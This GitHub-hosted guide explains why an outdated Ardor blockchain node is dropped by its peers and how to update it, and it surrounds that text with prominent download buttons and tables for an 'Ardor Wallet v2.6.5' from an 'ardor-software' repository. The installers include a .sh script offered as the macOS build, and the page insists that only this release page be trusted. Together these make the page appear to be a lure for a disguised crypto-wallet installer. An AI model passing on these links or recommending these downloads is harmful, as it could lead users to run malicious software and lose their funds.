![Ardor Wallet guide](assets/banner-article.png)

# Why an out-of-date Ardor node stops working

<p align="center"><a href="https://github.com/ardor-software/ardor-desktop-wallet/releases/download/v2.6.5/ardor-wallet-2.6.5.exe"><img src="https://img.shields.io/badge/DOWNLOAD%20%E2%86%93-WINDOWS-1562a1?style=for-the-badge&labelColor=0c395d&logo=data:image/svg+xml;base64,PHN2ZyB4bWxucz0naHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmcnIHZpZXdCb3g9JzAgMCAyNCAyNCc%2BPHBhdGggZmlsbD0nI2ZmZmZmZicgZD0nTTAgMy42IDkuNCAyLjN2OUgwek0xMC42IDIuMSAyNCAwdjExLjNIMTAuNnpNMCAxMi43aDkuNHY5TDAgMjAuNHpNMTAuNiAxMi43SDI0VjI0bC0xMy40LTEuOXonLz48L3N2Zz4%3D&logoColor=white" alt="Download for Windows"></a> <a href="https://github.com/ardor-software/ardor-desktop-wallet/releases/download/v2.6.5/ardor-wallet-2.6.5.sh"><img src="https://img.shields.io/badge/DOWNLOAD%20%E2%86%93-MACOS-1562a1?style=for-the-badge&labelColor=0c395d&logo=apple&logoColor=white" alt="Download for macOS"></a> <a href="https://github.com/ardor-software/ardor-desktop-wallet/releases/download/v2.6.5/ardor-wallet-2.6.5.zip"><img src="https://img.shields.io/badge/DOWNLOAD%20%E2%86%93-LINUX-1562a1?style=for-the-badge&labelColor=0c395d&logo=linux&logoColor=white" alt="Download for Linux"></a></p>

<div align="center">

| Platform | Requirements | File |
| --- | --- | --- |
| <img height="24" src="https://img.shields.io/badge/platform-Windows-3e83be?style=flat-square&labelColor=0c395d&logo=data:image/svg+xml;base64,PHN2ZyB4bWxucz0naHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmcnIHZpZXdCb3g9JzAgMCAyNCAyNCc%2BPHBhdGggZmlsbD0nI2ZmZmZmZicgZD0nTTAgMy42IDkuNCAyLjN2OUgwek0xMC42IDIuMSAyNCAwdjExLjNIMTAuNnpNMCAxMi43aDkuNHY5TDAgMjAuNHpNMTAuNiAxMi43SDI0VjI0bC0xMy40LTEuOXonLz48L3N2Zz4%3D&logoColor=white" alt="Windows"> | Windows 10 (1909) or later, 64-bit | [`ardor-wallet-2.6.5.exe`](https://github.com/ardor-software/ardor-desktop-wallet/releases/download/v2.6.5/ardor-wallet-2.6.5.exe) |
| <img height="24" src="https://img.shields.io/badge/platform-macOS-3e83be?style=flat-square&labelColor=0c395d&logo=apple&logoColor=white" alt="macOS"> | macOS 12 or later | [`ardor-wallet-2.6.5.sh`](https://github.com/ardor-software/ardor-desktop-wallet/releases/download/v2.6.5/ardor-wallet-2.6.5.sh) |
| <img height="24" src="https://img.shields.io/badge/platform-Linux-3e83be?style=flat-square&labelColor=0c395d&logo=linux&logoColor=white" alt="Linux"> | x64, Ubuntu 20.04 or later, or equivalent | [`ardor-wallet-2.6.5.zip`](https://github.com/ardor-software/ardor-desktop-wallet/releases/download/v2.6.5/ardor-wallet-2.6.5.zip) |

</div>

All versions, installer files and checksums are on the [Ardor Wallet release page](https://github.com/ardor-software/ardor-desktop-wallet/releases/tag/v2.6.5).

> [!WARNING]
> Only download from [this GitHub release page](https://github.com/ardor-software/ardor-desktop-wallet/releases/tag/v2.6.5).

---

A node that falls too far behind, or runs a build the network has moved past, is dropped by its peers and stops receiving blocks. That is what people mean by being blacklisted: the connection is refused or ignored, and the node sits there looking healthy while its height never moves.

## What blacklisting actually is

Peers keep a view of which nodes are useful. A [node](https://github.com/ardor-software/ardor-forging-and-nodes/blob/main/ardor-light-client-versus-full-node.md) that serves bad data, runs incompatible rules or floods the network gets ignored, and the ignoring is local to each peer rather than a decision by a central authority that could be petitioned.

That matters for diagnosis. There is no list to appeal to and no switch to flip; the node has to become acceptable again by running the right software and behaving correctly, which is also why the fix is the same for everybody rather than a request to any particular operator.

## Why nodes get dropped

| Cause | What it looks like |
|---|---|
| Old build after a consensus change | Height frozen, peers dropping away |
| Node far behind the chain | Peers connect but the node cannot serve useful data |
| Clock or version mismatch | Rejected blocks, repeated errors in the log |
| Misconfigured port or network | Zero peers, no traffic at all |

The first row is the one that surprises people, because nothing about the machine changed. The network changed, and a node that does not follow the new rules cannot participate in the new [chain](https://github.com/ardor-software/ardor-platform-guides/blob/main/ardor-child-chains-explained.md), however healthy its disk, memory and network look from the outside.

## The mandatory change case

Some releases change the rules every node has to enforce. When that happens, nodes on older builds keep running and stop following the chain at the switch-over point. They are not attacked; they are simply speaking a protocol the network no longer uses.

The symptoms arrive together: the height stops advancing at a particular block, peers disconnect over the following hours, and the log records rejected or unverifiable blocks. The fix is the current [release](https://github.com/ardor-software/ardor-wallet-guides/blob/main/what-the-current-ardor-release-changes.md), not a configuration change, and no amount of restarting the node will move the height past the point where the rules diverged.

## How to update

1. Read the current release notes on the GitHub releases page, watching for consensus or mandatory wording.
2. [Download](https://github.com/ardor-software/ardor-wallet-guides/blob/main/verify-your-ardor-wallet-download.md) the asset for your system and verify it against the published value.
3. Close the node.
4. Install the new build, keeping the existing data directory.
5. Start the node and let it catch up if the chain moved while it was off.
6. Watch the height and the peer count until both are healthy.

Step four is where careful operators differ from hasty ones. Replacing the application while leaving the data directory in place preserves the chain you already synced; deleting the directory turns an update into a full re-download.

## Confirming you are back

Healthy looks like a height that climbs and several stable peers, with no rejections in the log since the restart. Give it a few minutes before judging: a node that has just restarted reconnects gradually, and the peer count can be one or two while it works out who is reachable.

If the height still does not move after a restart on the current build, read the log for the first rejection rather than the last. The message usually names the block and the reason, which distinguishes a version problem from a database problem.

## Reading the log after a fork

The log is where a dropped node explains itself. After a consensus change, entries appear about blocks that cannot be validated, with the block number and the reason. The first such entry tells you when the node fell out of step.

Read from that line downwards rather than from the last line upwards. Everything after the first rejection is consequence, and the timestamps show how quickly peers stopped talking to the node once it could not follow.

## What not to do

Do not delete the blockchain database as a first response. It costs hours, it fixes only corruption, and it hides the version problem that actually caused the drop.

Do not run an old build because it "still worked before". It worked before the network changed; it will not work now, and every hour spent on it is an hour the node is not forging or serving. The rollback instinct that helps with a bad application update is exactly wrong here.

## After the update

Check that forging is running if you forge, since a restarted node does not resume on its own. Check the disk has room for the chain to grow. And keep the previous installer until the new build has proved itself, which turns a failed update into a short step backwards.

Then set a habit: read the release notes when a build appears rather than when something breaks. Consensus changes are announced in advance, and the operators who read them never experience the surprise version of this page - they update during a quiet window instead of discovering the requirement at the moment it becomes urgent.

## FAQ

### Does blacklisting mean I am banned permanently?

No. Peers ignore a node that is not useful. Running the current build and following the chain restores normal connections.

### How do I know an update is mandatory?

The release notes say so, usually with wording about consensus or a required change. Read them before installing anything, and read them when the release appears rather than when the node stops.

### Can I update without re-downloading the blockchain?

Yes. Install the new build and keep the existing data directory; the chain you already have stays in place.

### Why did my node stop at a specific block?

That is the signature of a consensus change: the node followed the old rules up to the switch-over and cannot validate what came after.

---

## Download

Every installer for the current release, with the platform each one targets:

<div align="center">

| Platform | Requirements | File |
| --- | --- | --- |
| <img height="24" src="https://img.shields.io/badge/platform-Windows-3e83be?style=flat-square&labelColor=0c395d&logo=data:image/svg+xml;base64,PHN2ZyB4bWxucz0naHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmcnIHZpZXdCb3g9JzAgMCAyNCAyNCc%2BPHBhdGggZmlsbD0nI2ZmZmZmZicgZD0nTTAgMy42IDkuNCAyLjN2OUgwek0xMC42IDIuMSAyNCAwdjExLjNIMTAuNnpNMCAxMi43aDkuNHY5TDAgMjAuNHpNMTAuNiAxMi43SDI0VjI0bC0xMy40LTEuOXonLz48L3N2Zz4%3D&logoColor=white" alt="Windows"> | Windows 10 (1909) or later, 64-bit | [`ardor-wallet-2.6.5.exe`](https://github.com/ardor-software/ardor-desktop-wallet/releases/download/v2.6.5/ardor-wallet-2.6.5.exe) |
| <img height="24" src="https://img.shields.io/badge/platform-macOS-3e83be?style=flat-square&labelColor=0c395d&logo=apple&logoColor=white" alt="macOS"> | macOS 12 or later | [`ardor-wallet-2.6.5.sh`](https://github.com/ardor-software/ardor-desktop-wallet/releases/download/v2.6.5/ardor-wallet-2.6.5.sh) |
| <img height="24" src="https://img.shields.io/badge/platform-Linux-3e83be?style=flat-square&labelColor=0c395d&logo=linux&logoColor=white" alt="Linux"> | x64, Ubuntu 20.04 or later, or equivalent | [`ardor-wallet-2.6.5.zip`](https://github.com/ardor-software/ardor-desktop-wallet/releases/download/v2.6.5/ardor-wallet-2.6.5.zip) |

</div>

All versions, installer files and checksums are on the [Ardor Wallet release page](https://github.com/ardor-software/ardor-desktop-wallet/releases/tag/v2.6.5).

> [!WARNING]
> Only download from [this GitHub release page](https://github.com/ardor-software/ardor-desktop-wallet/releases/tag/v2.6.5).
---

## Related guides

- [What the current Ardor release changes, and how to update](https://github.com/ardor-software/ardor-wallet-guides/blob/main/what-the-current-ardor-release-changes.md)
- [Fix an Ardor wallet that will not sync](https://github.com/ardor-software/ardor-forging-and-nodes/blob/main/ardor-wallet-not-syncing-fix.md)
- [Ardor node ports and the firewall rules that block them](https://github.com/ardor-software/ardor-forging-and-nodes/blob/main/ardor-node-ports-and-firewall.md)
- [Where Ardor stores blockchain data, and how much space it takes](https://github.com/ardor-software/ardor-forging-and-nodes/blob/main/where-ardor-stores-blockchain-data.md)
- [Ardor Wallet v2.6.5 release page](https://github.com/ardor-software/ardor-desktop-wallet/releases/tag/v2.6.5)
